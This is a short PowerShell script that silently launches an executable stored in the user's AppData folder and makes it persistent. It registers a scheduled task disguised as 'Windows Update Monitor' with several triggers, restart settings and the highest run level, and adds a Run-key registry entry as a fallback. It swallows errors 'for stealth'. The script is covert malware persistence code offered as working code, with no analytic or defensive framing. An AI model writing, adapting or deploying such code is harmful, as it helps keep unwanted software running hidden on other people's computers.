# === CONFIG ===
$exePath = "$env:APPDATA\WinUman.exe"
$taskName = "Windows Update Monitor"

# === MAIN ===
try {
    # Ensure EXE exists
    if (-not (Test-Path $exePath)) {
        return  # Exit if EXE not found
    }

    # Launch EXE silently
    Start-Process -FilePath $exePath -WindowStyle Hidden

    # Define action and multi-trigger persistence
    $action = New-ScheduledTaskAction -Execute $exePath
    $triggers = @(
        New-ScheduledTaskTrigger -AtLogOn,
        New-ScheduledTaskTrigger -AtStartup,
        New-ScheduledTaskTrigger -AtIdle -IdleDuration (New-TimeSpan -Minutes 1),
        New-ScheduledTaskTrigger -AtWorkStationUnlock,
        New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1))
    )
    $settings = New-ScheduledTaskSettingsSet -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1)

    # Create task if it doesn't exist
    if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $triggers -Settings $settings -RunLevel Highest
    }

    # Registry fallback
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUman" -Value $exePath

} catch {
    # Silent fail for stealth
}
